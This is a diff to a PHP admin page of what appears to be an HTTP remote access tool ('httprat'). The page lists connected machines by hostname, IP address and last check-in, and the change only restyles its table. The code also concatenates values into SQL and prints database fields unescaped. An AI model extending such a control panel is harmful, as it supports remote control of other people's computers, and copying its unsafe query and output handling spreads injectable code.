@@ -10,8 +10,11 @@ if(mysqli_connect_error())
 
 if (isset($_SESSION["admin"]))
 {
-	echo '<table width="90%" align="center">';
-	echo '<th>Computer_id</th><th>Version</th><th>HostName</th><th>System</th><th>IP Address</th><th>Last Sign-in Time</th>';
+	echo 
+	'<table class="table">
+		<thead>
+			<tr><th>Computer_id</th><th>Version</th><th>HostName</th><th>System</th><th>IP Address</th><th>Last Sign-in Time</th></tr>
+		</thead>';
 
 
 	$timenow = time();
@@ -20,15 +23,14 @@ if (isset($_SESSION["admin"]))
 	{
 			$lasttime = $row["lasttime"];
 			if (($timenow - strtotime($lasttime)) <= 200)
-			{      //<a href="url">Link text</a>
-				echo '<tr align=center>';
-				echo '<td>'.'<a href="submit.php?id='.$row["id"].'">'.$row["id"].'</a>'.'</td>';
-				echo '<td>'.$row["ver"].'</td>';
-				echo '<td>'.$row["name"].'</td>';
-				echo '<td>'.$row["system"].'</td>';
-				echo '<td>'.$row["IP"].'</td>';
-				echo '<td>'.$row["lasttime"].'</td>';
-				echo '</tr>';
+			{   
+				echo 
+				'<tr>
+					<td><a href="submit.php?id='.$row["id"].'">'.$row["id"].'</a></td>
+					<td>'.$row["ver"].'</td><td>'.$row["name"].'</td>
+					<td>'.$row["system"].'</td><td>'.$row["IP"].'</td>
+					<td>'.$row["lasttime"].'</td>
+				</tr>';
 			}
 			else
 			   {$mysqli->query('delete FROM httprat where id='.$row["id"]);}
